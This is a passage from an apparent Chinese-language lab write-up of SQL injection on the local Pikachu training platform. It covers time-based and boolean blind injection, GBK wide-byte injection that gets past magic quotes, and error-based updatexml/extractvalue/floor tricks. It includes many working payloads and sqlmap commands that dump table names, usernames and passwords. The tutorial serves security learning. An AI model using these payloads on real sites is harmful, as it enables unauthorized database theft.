<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p User-Agent --batch</span><br></pre></td></tr></table></figure>

<h1 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h1><p>当输入任何数据后返回的信息都是同样的时候，可以尝试时间盲注，通过网页加载的时间判断是否存在注入</p>
<p><img src="/images%5Cimage-20230110084215643.png" alt="image-20230110084215643"></p>
<p>该页面无论输入什么输出的内容都是”i don’t care who you are!”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&quot; and sleep(2)%23 //正常加载</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and sleep(2)%23 //延迟2秒加载</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110085004995.png" alt="image-20230110085004995"></p>
<p>判断该注入为字符型注入，并且闭合是分号</p>
<h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><p>时间盲注猜解数据库信息和布尔盲注类似，不同的是多利用到if语句和sleep函数</p>
<h4 id="mysql-if"><a href="#mysql-if" class="headerlink" title="mysql if"></a>mysql if</h4><p>sleep(n)就是停止n秒，这里就不再提了</p>
<p><img src="/images%5Cimage-20230110085453488.png" alt="image-20230110085453488"></p>
<h4 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if(length(database())&gt;=8,sleep(2),1)%23	# 返回时间4毫秒</span><br><span class="line">?name=lili&#x27; and if(length(database())&gt;=7,sleep(2),1)%23	# 返回时间2秒</span><br></pre></td></tr></table></figure>

<h4 id="猜数据库名"><a href="#猜数据库名" class="headerlink" title="猜数据库名"></a>猜数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr(database(),1,1))&gt;=112,sleep(2),1)%23	# 第一位112</span><br><span class="line">?name=lili&#x27; and if(ascii(substr(database(),2,1))&gt;=105,sleep(2),1)%23	# 第二位105</span><br></pre></td></tr></table></figure>

<h4 id="猜表信息"><a href="#猜表信息" class="headerlink" title="猜表信息"></a>猜表信息</h4><p>猜数据表个数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())&gt;=5,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜表名长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=8,sleep(2),1)%23		# 第一张表表名长度为8</span><br><span class="line">?name=lili&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=6,sleep(2),1)%23		# 第二张表表名长度为6</span><br></pre></td></tr></table></figure>

<p>猜表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=104,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>通过修改limit、substr值来限制查询位置与个数</p>
<h4 id="猜字段信息"><a href="#猜字段信息" class="headerlink" title="猜字段信息"></a>猜字段信息</h4><p>猜字段个数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)&gt;=4,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段名长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if(length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;  limit 0,1))&gt;=2,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;104,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<h4 id="猜字段值"><a href="#猜字段值" class="headerlink" title="猜字段值"></a>猜字段值</h4><p>猜字段值个数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if((select count(id) from users)&gt;=3,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段值长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if(length((select username from users limit 0,1))&gt;=5,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;=97,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>不同的字段通过limit控制</p>
<p>字段中不同的字符通过substr控制</p>
<p>判断个数用lenth控制</p>
<h2 id="sqlmap-5"><a href="#sqlmap-5" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -p name --batch</span><br></pre></td></tr></table></figure>

<h1 id="基于boolian的盲注"><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h1><p>当没有任何输出的时候，就需要使用到盲注</p>
<p>布尔盲注的场景条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.没有任何报错输出</span><br><span class="line"></span><br><span class="line">2.能够判断出ture还是false(比如条件正确有结果错误没有结果)</span><br></pre></td></tr></table></figure>

<p>本题输入正确的用户名lili</p>
<p><img src="/images%5Cimage-20230109234433676.png" alt="image-20230109234433676"></p>
<p>输入错误的用户名</p>
<p><img src="/images%5Cimage-20230109234546270.png" alt="image-20230109234546270"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lili&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109234741138.png" alt="image-20230109234741138"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lili&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109234818055.png" alt="image-20230109234818055"></p>
<p>所以可以判断出为字符型注入，且闭合为’</p>
<h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h2><p>盲注最麻烦的就是，正确会显示一个结果，错误又显示另一个结果，没有其余的显示</p>
<p>所以所有的数据库名，字段值等，只能靠猜</p>
<h3 id="猜数据库名长度-1"><a href="#猜数据库名长度-1" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and length(database())&gt;=7%23	# 回显正常</span><br><span class="line">?name=lili&#x27; and length(database())&gt;=8%23	# 回显异常</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109235411194.png" alt="image-20230109235411194"></p>
<p>数据库长度为7</p>
<h3 id="猜数据库值"><a href="#猜数据库值" class="headerlink" title="猜数据库值"></a>猜数据库值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lili&#x27; and ascii(substr(database(),1,1))&gt;113#</span><br><span class="line"></span><br><span class="line">lili&#x27; and ascii(substr(database(),1,1))&gt;=112#</span><br></pre></td></tr></table></figure>

<p>p的ascii码为112</p>
<p><img src="/images%5Cimage-20230110000502120.png" alt="image-20230110000502120"></p>
<p>于是对每个字符都这么测</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lili&#x27; and ascii(substr(database(),2,1))&lt;112#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110000702020.png" alt="image-20230110000702020"></p>
<p>所以第二个字符在a-p之间</p>
<h5 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII()"></a>ASCII()</h5><p>输出指定字符的ascii码值</p>
<h5 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h5><p><img src="/images%5Cimage-20230110000156970.png" alt="image-20230110000156970"></p>
<h3 id="猜数据表个数"><a href="#猜数据表个数" class="headerlink" title="猜数据表个数"></a>猜数据表个数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lili&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;=6#</span><br></pre></td></tr></table></figure>

<p>原理如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select 1) &lt;= 1;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110001003872.png" alt="image-20230110001003872"></p>
<h3 id="猜数据表名长度"><a href="#猜数据表名长度" class="headerlink" title="猜数据表名长度"></a>猜数据表名长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=9%23</span><br><span class="line">?name=lili&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=8%23</span><br></pre></td></tr></table></figure>

<h3 id="猜数据表名"><a href="#猜数据表名" class="headerlink" title="猜数据表名"></a>猜数据表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">猜第一张表表名的第一个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=105%23</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=104%23</span><br><span class="line"></span><br><span class="line">猜第一张表表名的第二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;=116%23</span><br><span class="line"></span><br><span class="line">猜第二张表表名的第一个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;=109%23</span><br><span class="line"></span><br><span class="line">猜第二张表表名的第二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))&gt;=101%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段个数"><a href="#猜字段个数" class="headerlink" title="猜字段个数"></a>猜字段个数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;=5%23</span><br><span class="line">?name=lili&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;=4%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段名长度"><a href="#猜字段名长度" class="headerlink" title="猜字段名长度"></a>猜字段名长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&gt;=2%23</span><br><span class="line">?name=lili&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&gt;=2%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;=106%23</span><br><span class="line">?name=lili&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;=105%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段内容个数"><a href="#猜字段内容个数" class="headerlink" title="猜字段内容个数"></a>猜字段内容个数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=lili&#x27; and (select count(id) from users)&gt;=3	# 正常</span><br><span class="line">?name=lili&#x27; and (select count(id) from users)&gt;=4	# 异常</span><br></pre></td></tr></table></figure>

<h3 id="猜字段内容长度"><a href="#猜字段内容长度" class="headerlink" title="猜字段内容长度"></a>猜字段内容长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据表users下的username字段的第一、二行数据内容长度</span><br><span class="line">?name=lili&#x27; and length((select username from users limit 0,1))&gt;=5%23	# 第一行</span><br><span class="line">?name=lili&#x27; and length((select username from users limit 0,1))&gt;=7%23	# 第二行</span><br></pre></td></tr></table></figure>

<h3 id="猜字段内容"><a href="#猜字段内容" class="headerlink" title="猜字段内容"></a>猜字段内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">猜username字段的第一行内容的第一、二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;=97%23	# 正常</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),2,1))&gt;=100%23	# 正常</span><br><span class="line"></span><br><span class="line">猜username字段的第二行内容的第一、二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;=97%23	# 正常</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),2,1))&gt;=100%23	# 正常</span><br></pre></td></tr></table></figure>

<h2 id="sqlmap-6"><a href="#sqlmap-6" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>遇到盲注就别手注了，直接sqlmap或写脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_blind_b.php?name=lili&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -p name --batch</span><br></pre></td></tr></table></figure>

<p>sqlmap都得跑一阵子</p>
<p><img src="/images%5Cimage-20230110001714570.png" alt="image-20230110001714570"></p>
<p>但这题sqlmap使用的是时间盲注</p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/282252.html">https://www.freebuf.com/articles/network/282252.html</a></p>
<h4 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h4><p>magic_quotes_gpc（魔术引号开关）</p>
<p>magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据</p>
<p>如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
<p>单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线</p>
<p>可以看出这个在一定程度上就能对sql注入进行防护，因为我们没法通过引号或双引号制造闭合，我们输入的内容就不会被当作sql语句执行</p>
<h4 id="GBK编码"><a href="#GBK编码" class="headerlink" title="GBK编码"></a>GBK编码</h4><p>GBK编码是我国自己的一套编码，许多系统仍在沿用，</p>
<p>gbk是一种多字符编码。他使用了双字节编码方案，因为双字节编码所以gbk编码汉字，占用2个字节。</p>
<p>而一个utf-8编码的汉字，占用3个字节。</p>
<p>例如：</p>
<p>0xD50×5C 对应了汉字“誠 ”，URL编码用百分号加字符的16进制编码表示字符，于是 %d5%5c 经URL解码后为“誠”。</p>
<h4 id="宽字节SQL注入的原理"><a href="#宽字节SQL注入的原理" class="headerlink" title="宽字节SQL注入的原理"></a>宽字节SQL注入的原理</h4><p>数据库编码为非英文编码就有可能产生宽字节注入(比如GBK编码)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES &#x27;gbk&#x27;</span><br><span class="line">或</span><br><span class="line">SET character_set_client =gbk</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110091916345.png" alt="image-20230110091916345"></p>
<p>由于有magic_quotes_gpc的存在，传入的特殊字符会被添加一个转义字符”\“</p>
<p>“\“的url编码为%5c</p>
<p>于是我们可以再添加一个字符凑成一个gbk汉字，这样就会将”\“过滤</p>
<p>例如，運’字的GBK编码是%df%5c</p>
<p>当传入的sql语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1\&#x27;#&#x27;</span><br></pre></td></tr></table></figure>

<p>添加%df后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1運&#x27;#&#x27;</span><br></pre></td></tr></table></figure>

<p>注意：具体显示可能不会显示汉字，而是一个乱码，这里仅作了解原理</p>
<h2 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h2><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%df&#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110092955693.png" alt="image-20230110092955693"></p>
<p>可以判断为宽字节注入</p>
<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=1%df&#x27; order by 2#		# 正常</span><br><span class="line">name=1%df&#x27; order by 3#		# 异常</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093225671.png" alt="image-20230110093225671"></p>
<p>字段数为2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%df&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093329224.png" alt="image-20230110093329224"></p>
<h4 id="获取数据库-1"><a href="#获取数据库-1" class="headerlink" title="获取数据库"></a>获取数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%df&#x27; union select database(),2#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093413618.png" alt="image-20230110093413618"></p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%df&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093512717.png" alt="image-20230110093512717"></p>
<h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%df&#x27; union select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)),2#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093825765.png" alt="image-20230110093825765"></p>
<p>limit 3,1是用来选择数据库用的</p>
<p>select database()可能会有多行数据库，通过limit选择到想要的数据库</p>
<h4 id="获取字段值-1"><a href="#获取字段值-1" class="headerlink" title="获取字段值"></a>获取字段值</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%df&#x27; union select (select group_concat(username) from users),(select group_concat(password) from users)#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110094054457.png" alt="image-20230110094054457"></p>
<h2 id="sqlmap-7"><a href="#sqlmap-7" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap跑宽字节注入需要用到tamper</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--tamper unmagicquotes</span><br></pre></td></tr></table></figure>

<p>tamper是sqlmap的脚本，这里可以理解为sqlmap发送payload是将单引号前加一个%df</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_widebyte.php&quot; --data=&quot;name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -p name --batch --tamper unmagicquotes</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110095012638.png" alt="image-20230110095012638"></p>
<h1 id="报错注入前置知识"><a href="#报错注入前置知识" class="headerlink" title="报错注入前置知识"></a>报错注入前置知识</h1><h3 id="xpath报错注入"><a href="#xpath报错注入" class="headerlink" title="xpath报错注入"></a>xpath报错注入</h3><p>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updatexml()</span><br><span class="line">extractvalue()</span><br></pre></td></tr></table></figure>

<p>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错</p>
<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>用于改变文档中符合条件的节点的值</p>
<p>语法： </p>
<p>updatexml（XML_document，XPath_string，new_value）</p>
<p>第一个参数：是string格式，为XML文档对象的名称</p>
<p>第二个参数：代表路径，Xpath格式的字符串</p>
<p>第三个参数：string格式，替换查找到的符合条件的数据</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from information_schema.tables where (updatexml(1,0x7e,3));</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109155137082.png" alt="image-20230109155137082"></p>
<p>由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select 666),0x7e),1);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109155523640.png" alt="image-20230109155523640"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109160329164.png" alt="image-20230109160329164"></p>
<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>此函数从目标XML中返回包含所查询值的字符串 </p>
<p>语法：</p>
<p>extractvalue（XML_document，xpath_string） </p>
<p>第一个参数：string格式，为XML文档对象的名称</p>
<p>第二个参数：xpath_string（xpath格式的字符串） </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select 111),0x7e));</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109155950514.png" alt="image-20230109155950514"></p>
<p>concat用于连接两个字符串</p>
<p><img src="/images%5Cimage-20230109160149638.png" alt="image-20230109160149638"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109160306652.png" alt="image-20230109160306652"></p>
<h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>原理可以参考</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242986.html">https://www.freebuf.com/articles/web/242986.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/richardlee97/p/10617115.html">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
<p>可以先看一个payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109161907927.png" alt="image-20230109161907927"></p>
<p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分</p>
<h5 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h5><p>rand()函数可以用来生成0和1之间的随机数，但是rand(0)和rand()有本质区别</p>
<p>rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数生成</p>
<p>rand()生成的数字是完全随机的，而rand(0)是有规律的生成，我们可以在数据库中尝试一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure>

<p>结果每次都不一样</p>
<p><img src="/images%5Cimage-20230109162133611.png" alt=" "></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand(0);</span><br></pre></td></tr></table></figure>

<p>结果不会有变化</p>
<p><img src="/images%5Cimage-20230109162031881.png" alt="image-20230109162031881"></p>
<p>配合floor()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand(0)) from user;</span><br><span class="line"></span><br><span class="line">select floor(rand(0)*2) from user;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109162542325.png" alt="image-20230109162542325"></p>
<p>很显然rand(0)是伪随机的，有规律可循，这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，同样rand(n)都一样，这样每次注入都会报错，而rand()则需要碰运气了</p>
<p>输出多少看from的表有几列，每一列都会输出一个floor(rand(0))</p>
<h5 id="count"><a href="#count" class="headerlink" title="count(*)"></a>count(*)</h5><p>count(*)，这是一个聚合函数，返回值的数目，它与count()的区别是它不排除NULL</p>
<h5 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h5><p>floor()报错注入需要配合group by</p>
<p>GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sex,count(*) from member group by sex;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109164120043.png" alt="image-20230109164120043"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(floor(rand(0)*2),(select user()))x from member group by x;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109165251841.png" alt="image-20230109165251841"></p>
